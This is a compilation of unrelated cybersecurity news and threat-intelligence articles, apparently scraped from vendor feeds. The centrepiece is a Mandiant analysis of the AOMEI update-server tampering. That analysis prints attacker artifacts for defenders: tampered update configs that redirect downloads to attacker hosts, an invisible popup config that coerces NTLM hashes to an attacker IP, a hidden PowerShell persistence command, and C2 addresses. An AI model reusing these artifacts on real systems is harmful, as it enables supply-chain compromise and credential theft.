Title: France: Internet-Exposed Danfoss Controllers Drop 71% After Cyber-Attack
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Internet-exposed refrigeration controllers in France are disappearing from public view at a dramatic rate following a cyber incident targeting supermarket food supplies.

Censys researchers observed a 71% drop in internet-exposed Danfoss StoreView controllers in just three days after the October 11 cyber-attack targeting hundreds of supermarkets in France, suggesting that operators are moving quickly to limit their systems' online exposure.

Danfoss StoreView was among the equipment targeted by this cyber-attack. StoreView instances are typically used as control panels for Danfoss refrigeration controllers that are installed in many French supermarket fridges and freezers.

Danfoss, a Danish temperature regulation systems provider, has confirmed its equipment was targeted by the cyber-attack, and said most affected controllers were either older models that no longer received security updates (AK-SM800 and AK-SC355) or newer models running outdated firmware (AK-SM800A).

Danfoss patched three vulnerabilities in its AK-SM 800A controllers in March 2025 (CVE-2025-41450) and August 2025 (CVE-2025-41451 and CVE-2025-41452).

A year later, a researcher at industrial security provider Claroty demonstrated how CVE-2025-41450 and CVE-2025-41451 could be chained together to achieve remote code execution and thus disable cooling while falsifying temperature readings, potentially concealing failures in the cold chain.

While Danfoss has not confirmed the exact initial access vector, a plausible explanation is that attackers exploited unpatched vulnerabilities in internet-exposed Danfoss controllers to gain remote access to supermarket refrigeration systems.

Operators Take Danfoss Controllers Offline Instead of Patching

In a new report published on October 14, researchers at Censys have shown a significant drop in France-based Danfoss StoreView instances exposed to the internet in just three days after the attack.

Censys provides a specialized internet search engine that scans and indexes every internet-connected device, server and system on the globe. Instances that can be found with a Censys scan are typically connected to the internet without proper security controls obfuscating their activities, such as a corporate virtual server (VPN) connection.

Such exposure does not mean the instance carries a vulnerability. However, users of assets that are both vulnerable – like unpatched Danfoss AK-SM800A instances – and exposed to the internet, significantly increase their risk of compromise.

Censys found 2991 internet-exposed hosts with a Danfoss StoreView control panel on October 11. Among these, 61% (1825) were located in France.

According to the Censys report, the number of StoreView control panels in France fell to 1781 on October 12 and 537 on October 14 – a 71% drop.

Across other countries analyzed, the change isn’t as dramatic, with 966 internet-exposed hosts with a Danfoss StoreView control panel on October 11, down from 1166 three days earlier.

Title: New Aoki Infostealer Targets AI Coding Assistant Credentials
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
New versions of the Aoki infostealer are targeting credential and session files used by popular AI coding assistants, a new report by Symantec has warned.

This represents a significant development from to earlier versions of Aoki, which focused on browser, cryptocurrency wallet and password manager data, and did not target AI-related files.

Now, the stealer is also able to access API keys and tokens from a number of AI coding assistants, including Anthropic’s Claude, OpenAI's Codex, SpaceX’s Cursor and Google’s Gemini.

The Symantec researchers said that this information can allow a threat actor to carry out malicious activity under a legitimate developer's identity and API quota, bypassing safeguards that assume requests originate from a trusted user.

In addition, the tokens can expose connected repositories, cloud services and continuous integration and continuous delivery (CI/CD) pipelines linked to that account.

Aoki Targets ChatGPT, Claude and GitHub Copilot Credentials

The report, published on October 15, noted that Aoki is a relatively new and sparsely documented infostealer, first observed earlier in 2026.

The ability to steal AI-related files is recent and appears to be expanding, the researchers noted. The newest version of the stealer found by the Symantec’s Threat Hunter Team targeted .claude.json, Claude desktop cookies, ChatGPT cookies, and the Codex config.toml and .env files.

In addition, it stole tokens for GitHub Copilot, Cursor, Gemini, JetBrains AI Assistant and Kiro, along with Amazon Web Services (AWS) credentials.

“Aoki is a highly capable and multi-functional infostealer whose capabilities still appear to be in active development,” Symantec added.

AI Credentials Increasingly Valuable to Hackers

The researchers said Aoki’s development suggests that AI credentials are now considered just as valuable as payment card data and cryptocurrency wallets by threat actors.

“Like card data, a stolen AI key can be cashed in directly, either through resale or by running up usage on the victim's account, a practice sometimes called LLMjacking. Unlike card data, it can also give an attacker a route into the developer's wider environment,” they explained.

Symantec emphasized that it does not know which threat group may be behind the Aoki infostealer and there are no indications it has links to any existing malware family.

However, the rest of the stealer’s target list, which includes a focus on cryptocurrency related wallets and extensions, indicates that the attackers are financially-motivated.

Written by: Tyler McLellan

Introduction

Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning.

The campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017.

Based on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified.

This campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. METAL’s analysis of this campaign is available in their blog.

How AOMEI Update and Notification Systems Work

AOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services (Backupper.exe and ABNotify.exe) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups:

Figure 1: AOMEI Update Mechanism

Update Configuration (down_html.ini): The software periodically sends an HTTPS request to https://www2.aomeisoftware.com/download/abpopup/down_html.ini. This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download upgrade-now.zip.

Notification Configuration (Notifycfg.ini): The software contacts https://account.aomeitech.com/Notifycfg.ini. This file instructs the local notification process (ABNotify.exe) what messages to display and specifies commands or programs located in the software’s local directory to execute.

Under normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain (www2.aomeisoftware.com).

Campaign Overview

Rather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files.

During the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware.

In cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control.

Short Burst Supply Chain Tampering

A defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers:

May 28: 10-minute exposure window (05:40 – 05:50 UTC)

July 16: 6-minute exposure window (08:33 – 08:39 UTC)

July 20: 5-minute exposure window (10:35 – 10:40 UTC)

At the conclusion of each window, UNC7017 reverted both down_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes.

Weaponizing Native Update Logic: down_html.ini and Configuration Bloat

To compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down_html.ini and Notifycfg.ini.

To ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down_html.ini during each tampering window:

[Date] -Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip +Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 -thrid=5 +thrid=6 [MD5] -Val=EE89C99F3753231771170F5D9CBBAE1E +Val=31323E7E738230FA6A8DEEF2B7894666

Figure 2: July 16 tampering of down_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid=6) and synchronized MD5 hash.

During the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named [dummy_XXXXXX]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory.

Infrastructure Shifts

Between April an July 2026, UNC7017 shifted its staging and delivery infrastructure between public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic.

Infrastructure Shifts

Early Cloud Staging (April–May 2026): Early CROSSROAD payloads (upgrade-now.exe observed May 20) relied on Alibaba Cloud Object Storage (serv.oss-cn-hongkong.aliyuncs.com).

Dedicated Domain Infrastructure (July 1–7, 2026): The threat actor transitioned to dedicated, vendor-themed domains (storage-data.com, promotion.storage-data.com, aomei.storage-data.com).

Hybrid Cloud Delivery Split (July 20, 2026): During the 5-minute window on July 20, the threat actor modified down_html.ini to direct initial client downloads to a public Google Cloud Storage bucket (storage.googleapis.com/aomeiupdate/upgrade-now.zip) rather than storage-data.com. This tactical shift allowed the initial download to bypass enterprise proxy filters that block Newly Registered Domains (NRDs), while the executed CROSSROAD loader continued to leverage storage-data.com for secondary payload retrieval and C2 communications.

[Date] Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 thrid=7 [MD5] Val=BF73C4391B58CA95220CE3AE03F66DCF

Figure 3: July 20 modification of down_html.ini utilizing Google Cloud Storage (thrid=7) to evade Newly Registered Domain (NRD) perimeter blocks.

WebDAV NTLM Credential Coercion

On July 20, UNC7017 introduced a secondary exploitation vector inside Notifycfg.ini. Prior to tampering, Notifycfg.ini displayed a legitimate 400x380 promotional banner advertising "World Cup Deals." The threat actor replaced this banner with an invisible 1x1 pixel window (Width=1, Height=1) assigned maximum execution priority (Priority=9999) that instructed the client to render a remote HTML file over a universal naming convention (UNC) WebDAV path:

[PopWindow1] ID=307 Title=20260408-AB Flash Sale (All Lang 不含EN) Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html" Width=1 Height=1 Priority=9999

Figure 4: Malicious Notifycfg.ini configuration from July 20 implementing an invisible 1x1 popup window to coerce WebDAV/NTLM authentication to 8.210.84.56.

By forcing the AOMEI client to request a remote file:// resource via WebDAV (DavWWWRoot), UNC7017 created a silent credential harvesting mechanism capable of coercing endpoints into transmitting NetNTLMv2 authentication hashes to the actor-controlled IP address (8.210.84.56) without user visibility.

Malware Delivery & Post-Exploitation Tooling

Across the campaign waves, UNC7017 deployed a consistent chain of custom loaders and commercial/open-source post-exploitation frameworks:

Defense Evasion via Timestomping: Analysis of an early CROSSROAD dropper (upgrade-now.exe) submitted to VirusTotal on May 20 revealed that the threat actor manipulated PE compilation timestamps to display fabricated 2024 build dates in an effort to complicate forensic timeline analysis.

Modified Radmin Server Backdoor: During the May 28 wave, the unsigned loader dropped into the html/ directory executed rsetup64.exe /intsetup, silently installing a modified version of the commercial remote administration tool Radmin Server to establish persistent remote access.

Adaptix C2 Integration: Since at least early July 2026, the threat actor was observed deploying the Adaptix C2 framework across its storage-data.com infrastructure.

The Primary Downloader: CROSSROAD

The primary Stage-2 downloader (upgrade-now.exe, SHA256: 9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450) is a 64-bit Windows executable written in C, tracked by GTIG as the CROSSROAD malware family. Delivered inside upgrade-now.zip, CROSSROAD is responsible for environment validation, active endpoint cleanup, staging the secondary payload bundle, and establishing scheduled task persistence for the Stage-3 backdoor suite.

Path Verification: As part of its configuration routine, CROSSROAD checks whether its file path contains the substring AOMEI. If the substring is absent, it initiates a self-deletion routine; however, it does not abort, continuing both its background configuration cleanup and its downloader routines regardless.

Execution Guardrails: Before proceeding with secondary downloads, CROSSROAD enforces two primary checks:

Geolocation Check: Queries external domain name system (DNS) (myip.opendns.com, o-o.myaddr.l.google.com) and HTTP reflection services (checkip.amazonaws.com, api.ipify.org, ifconfig.me/ip, icanhazip.com) using custom User-Agents (Anyviewer-loader/1.0, Anyviewer-ipcheck/1.0). In specific execution branches, if the returned country code is "CN" (China), the loader aborts its primary payload execution path.

Lock Mutex: Acquires the named mutex Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883} to prevent multiple concurrent instances on the same host.

Host Artifact Reversion & Anti-Forensics: To complicate post-incident triage and forensic reconstruction, the loader systematically reverts local configuration states during its execution cycle. The malware parses down_html.ini (located at <install_dir>\..\..\), restoring the update thread parameter (thrid) to its default value of 5 and pointing the update download URL back to legitimate AOMEI distribution infrastructure (https://www2.aomeisoftware.com/download/abpopup/).

Stage-3 Payload Staging & Extraction: If environment checks pass, CROSSROAD downloads https://promotion.storage-data.com/config/component.zip (also observed as en.zip), to %TEMP%\svc<random_hex>.tmp, and unpacks its contents into the user’s local application data directory using an embedded miniz library.

Persistence via Scheduled Task: To ensure continuous execution of the staged payload bundle, upgrade-now.exe registers a persistent scheduled task named RadminComponentRuntime (configured with the description”Radmin Component runtime checkable.”). The task is set to execute %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk every three hours.

Self-Deletion (--nitrod): After extracting the payload bundle and creating the scheduled task, CROSSROAD purges itself from disk. To bypass Windows file-locking constraints, the executable drops a copy of itself to the temporary directory and executes it with the --nitrod parameter, passing its parent PID via NITRODP and original executable path via NITRODT. The child process waits for the parent to terminate, renames the original binary's primary :$DATA stream to an alternate data stream named :wtfbbq via SetFileInformationByHandle, and flags FileDispositionInfo with DeleteFile = TRUE to unlink the binary on handle close.

Version Information: The executable contained standard PE version metadata with a notable typo string: "ProductName: AOMEI Update Compent".

Figure 5: Victim Profiling, Malware Delivery Logic

Stage-3 Payload: SHINYROAD and Radmin Suite

The payload archive unpacked into %LOCALAPPDATA%\Radmin\ by CROSSROAD contains a Famatech Radmin 3.x administration bundle used to deliver the SHINYROAD modular backdoor framework. The malware contains no native persistence mechanism of its own and relies entirely on the external scheduled task registered by CROSSROAD for execution.

Execution via DLL Search-Order Hijacking (BlkScrDl.dll): Execution begins when the persistent RadminComponentRuntime scheduled task launches the legitimate, signed Radmin binary %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk (or FamItrf2.exe). During startup, the Radmin executable is hijacked into loading the attacker's unsigned DLL, BlkScrDl.dll, via search-order hijacking. The adversary named this DLL to masquerade as Radmin's legitimate "blank screen" driver library.

Shared Memory & In-Process COM Server Staging: Upon execution, BlkScrDl.dll locates config.zip in its execution directory, maps its raw contents into a shared memory section named Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf, and dynamically registers csvc\RuntimeComponent.dll as an in-process COM Server under CLSID {21191641-0D7F-4CD9-9572-01AAE6E7851B} and AppID {9AD3E98A-4C7E-4F37-982D-D73D41E4F91B}.

COM-Triggered Stage-2 Initialization & Embedded PocketPy VM: When the Radmin process instantiates the registered CLSID, the Windows COM subsystem loads the DLL. The DLL reads config.zip directly from shared memory, extracts the encrypted payload metadata.dat, and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which RuntimeComponent.dll executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to 8.218.65.184:443.

Evolution of the SHINYROAD Architecture

Analysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (_pyio_compat, _pyio_struct, and pkpy) to avoid loading standard Python libraries on disk:

Custom Binary C2 Protocol: Earlier variants communicated over raw TCP (8.218.65.184:41397). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID.

In-Memory Capabilities: The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the pkpy WorkPool thread manager without writing script modules to disk.

Post-Exploitation: Nitro PDF Theme & Adaptix C2

In mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools (NitroPromotion.exe):

Persistence: The malware installed a scheduled task named \NitroRuntime that executed:

powershell -Command "Start-Process 'C:\Users\<USER>\AppData\Local\Temp\NitroPromotion.exe' -WindowStyle Hidden"

Figure 6: NitroRuntime scheduled task persistence

Adaptix C2 Beaconing: The executable sideloaded Eztwain4.dll (ADAPTAGENT) from %LOCALAPPDATA%\Nitro Pro\, which established periodic 2-minute beacons to 8.210.84.56:6800.

Outlook and Implications

This campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., SolarWinds, 3CX). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis.

UNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative:

Anti-Analysis by Design: By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files.

Selective Exploitation: Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure.

Dual-Pronged Approach: Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked.

Co-opting Commercial Software: Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules.

Remediation and Hardening

Defenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published Mitigation Guidance for Supply Chain Compromise.

Vendor Notification & Architecture Hardening

On July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken.

Why Server-Side Remediation Does Not Disinfect Endpoints

Crucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed.

Persistent Resident Payloads: Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers.

Obscured Root Cause: While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification.

Hunting Imperative: Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post.

Guidance for Software Vendors & Developers

Software supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls:

End-to-End Cryptographic Signature Verification: Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file).

Cryptographically Signed Configuration Files: Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration.

Domain Allowlisting and Destination Pinning: Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets.

Restricting Uniform Resource Identifier (URI) Schemes in In-App Handlers: Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols (https://) and explicitly disallow local file (file://) and UNC WebDAV schemes to prevent external NTLM credential coercion.

Decoupling Core Updates from Marketing Channels: Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution.

Origin Integrity Monitoring and Access Controls: Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes.

Guidance for Security Operations (SOC) & Incident Responders

Overcoming the "Point-in-Time" Triage Pitfall

The short-burst nature of this attack creates a unique challenge for incident response:

The Triage Trap: When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive.

Actionable IR Protocol: Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in %PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\ and review proxy/firewall telemetry corresponding to the precise second the alert was triggered.

Camouflaged Follow-on Activity

The deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering.

Title: Microsoft Disrupts Global Yam Store Network Behind One Billion Phishing Messages
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Microsoft has teamed up with industry and law enforcement partners to disrupt a major phishing infrastructure network which has targeted tens of thousands of organizations worldwide since January.

In a report published on October 14, Microsoft detailed how its work with Japanese police soon unravelled a network of Chinese-language phishing-as-a-service (PhaaS) kit operators, developers, and a marketplace selling tools and infrastructure.

“Threat actors purchased and used these tools and infrastructure, including phishing kits and access to compromised or fraudulent Microsoft or Google cloud environments and related credentials, to target organizations across the healthcare, financial services, wholesale distribution, and IT sectors in Japan, the US, Australia, and India,” it explained.

The phishing kits alone have been responsible for over a billion phishing emails and texts sent to over 75,000 organizations since January 2026, it added.

Read more on global phishing infrastructure: Global Takedown Neutralizes Tycoon2FA Phishing Service

The network centers around Yam Store, an underground marketplace tracked by Microsoft as Storm-3119.

Yam Store sells fraudulently obtained or compromised Microsoft and Google domains as well as offering three phishing kits: CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System. The latter three kits are grouped under Storm-2990.

In terms of the phishing infrastructure, Yam Store operators found internet domains that legitimate organizations had allowed to expire.

“They then rebuilt the websites to make those organizations appear active, allowing them to fraudulently obtain Microsoft 365 accounts that could later be sold through Yam Store,” another Microsoft writeup explained.

“Storm-3119 resells the hijacked accounts, licenses, and storage through an automated storefront, operating as the access broker that supplies these resources to downstream operations.”

On other occasions, the group created fake organizations, likely using AI-generated content and forged documents, to establish Microsoft tenants.

Understanding Storm-2990

Yam Store sells the phishing infrastructure outlined above alongside the Storm-2990 kits.

“They are designed to impersonate organizations across several industry verticals to steal information, including sign-in credentials (usernames, passwords) and financial data (credit card information), used to gain access to network environments,” Microsoft said.

The lures focus on subjects like unpaid tolls and traffic fines, parcel-delivery issues, bank and government impersonation and fake login pages. The goal is credential stealing, device code phishing, and use of stolen payment data “to make fraudulent purchases of high-end goods or fraudulent transactions on legitimate financial platforms.”

It’s unclear how many consumers, as well as organizations, were targeted by Storm-2990 and Storm-3119 The kits feature a number of advanced evasion techniques including geofencing, fake CAPTCHA gates, and anti-detection configurations, the report claimed.

“Microsoft has already disabled more than 20,000 accounts connected to YAM Store and continues to dismantle the operation by removing infrastructure hosted on its services and blocking more than 100,000 domains used for impersonation and fraud,” the tech giant noted.

Title: Working in Boston at the World’s Largest Intelligence Company
Context: Working in Boston at the World’s Largest Threat Intelligence Company Although Recorded Future was founded by Swedish scientists and innovators, our HQ has always been a key part...
Full Text:
The culture

As we’ve grown, the office has brought together more teams, more perspectives, and more responsibilities. Futurists describe our culture in many ways, such as open, friendly, energized by positive change, and characterized by camaraderie. But, with every conversation, the same theme comes back and resonates with Boston Futurists: the sense of community. Beyond our global monthly newsletters and our fun Slack channels, we insist on making time and space to come together for in-office gatherings and celebrations.

“Even with all the change, people still show up for one another,” said Lisa Cefalo. “The office may have grown, but that sense of community has stayed with us.”

We asked longtime Boston Futurists about their favorite memories, and this is what we heard:“When a longtime team member retired — a rare event around here, so we were a little rusty at saying goodbye — everyone recorded a short video sharing what they would miss about them,” said Lisa Cefalo. “It brought her to tears, and probably a few of us, too. It was a reminder that you’re building more than a career here; along the way, you’re building a work family.”

“One of my favorite events was sailing on the Charles and hanging out with colleagues in the summer sun,” said Lacey Maddalena.

Why Recorded Future?

At Recorded Future, Futurists are given ownership of their careers and growth, backed by the resources needed to succeed and make an impact. Lacey Maddalena, a Futurist for over seven years, experienced this firsthand.

“I've been given a lot of opportunities to try new things. I started at the company as a recruiter, moved into employer branding, and now oversee our global facilities and real estate team,” she shared. “There aren't many companies that give employees the chance to try new roles and develop their careers in so many new ways.”Maura Naughton, Strategy & Business Operations Director, credits this culture of opportunities to the company’s leadership.

“I've had six different roles over the 10 years I’ve worked here,” she said. “It's been an incredible place to learn, grow, and try.”

Beyond individual professional growth, what unites team members is a clear mission: to secure our world with intelligence. Today, Futurists help secure over 1,900 clients across more than 80 countries.

“What I’ve enjoyed most is sharing the big moments with the people who made them possible,” Lisa added, reflecting on the collective impact. “We’ve navigated change and built something bigger together. Seeing how far we’ve come has been incredibly rewarding.”

Title: Russia Is Tightening Internet Controls, Leading to Operational Risks
Context: The Kremlin likely views these measures as necessary to make it more difficult for Russian elites or the public to coordinate political dissent, and for the Ukrainian government...
Full Text:
Executive Summary

Since mid-2025, the Kremlin has intensified restrictions on digital communications and infrastructure, very likely to suppress the organization of domestic political dissent and conduct digital surveillance within Russia. Increasingly strict measures targeting virtual private networks (VPNs), state-managed internet shutdowns, limitations on civilian communications platforms, and monitoring of domestic and foreign entities very likely represent an escalation from the approaches to censorship and surveillance pursued prior to 2024.

However, despite intensifying internet restrictions, technical and political limitations will likely prevent the Kremlin from achieving its long-held objective of a fully “sovereign internet” in the near term. The most likely scenario is that Moscow exerts extensive censorship and monitoring of online activity with increasingly strict –– though not absolute –– controls on circumvention and anonymizing tools.

Insikt Group assesses that the Kremlin’s primary objectives regarding internet restrictions are twofold: facilitating extensive surveillance of online activity to support control over the domestic information space while maintaining connectivity to the global internet, and developing national internet infrastructure under Kremlin control, enabling isolation from the global internet if the Kremlin so chooses. Efforts in support of these objectives have almost certainly provided the Kremlin with enhanced ability to control and monitor domestic online discourse.

In this environment, individuals and organizations operating in Russia are subject to increasing operational risks, including surveillance and exposure of sensitive data, challenges in conducting emergency communications, disruptions to corporate tools and digital applications, and legal risks. Entities with indirect exposure to Russia face an increased likelihood of supply-chain disruptions and sanctions violations and, over the longer term, face challenges in assessing the political and economic situation in Russia, as restrictions limit the availability of high-quality open sources.

Key Findings

The Kremlin is very likely using managed internet shutdowns across Russia to test and improve its ability to isolate the Russian internet, though technical and political limitations make it unlikely that it will achieve its objective of establishing a fully “sovereign internet” in the near term.

In the near- to medium-term, a combination of falling approval ratings for Russian President Vladimir Putin, declining public opinion amid economic strain, and ongoing Ukrainian drone strikes very likely incentivize Moscow to impose further internet restrictions, regardless of reported public dissatisfaction with some of these measures.

The Kremlin will very likely continue to pursue strategies to deter VPN use by forcing platforms to support VPN blocks and making VPN use more expensive and inconvenient, though likely avoiding direct punitive measures against individual users.

Kremlin Systematically Tightening Internet Restrictions

Since July 2025, the Kremlin has systematically tightened access to widely used civilian communications applications and VPNs, caused regular mobile internet outages across Russia, and instituted requirements that place Russian and foreign individuals and firms under increased government surveillance. The Kremlin likely views these measures as necessary to make it more difficult for Russian elites or the public to coordinate political dissent, and for the Ukrainian government to launch drone strikes against Russian critical infrastructure.

Restrictions Represent Marked Escalation in Control Over Russian Internet

Insikt Group assesses that, since 2012, Russians have seen their ability to operate without restriction on the internet decline in several waves, primarily driven by the Kremlin's calculation that Russians were using the internet to organize anti-government political actions.

2000–2012: Little Government Oversight

Laissez-Faire State Policy

During this period, the Kremlin generally viewed the internet as politically non-threatening, in part due to low internet penetration rates in Russia (from 1.8% in 2000 to 58% in 2011).

Thriving Media and Social Platforms

Individual expression on the internet was relatively free, with independent news sites such as Lenta, Novaya Gazeta, Ekho Moskvy, and Gazeta able to operate largely without government interference.

In addition, platforms such as LiveJournal and VKontakte (VK) –– Russia’s Facebook mirror –– operated largely without government control.

Minimal Government Regulation

Russian state telecommunications regulator Roskomnadzor was founded in 2008, but primarily handled telecommunications licensing rather than censorship or content filtering.

2012–2015: Blocklists and Platform Takeovers Following Mass Protests

Laws Passed Creating Blocklists of Websites

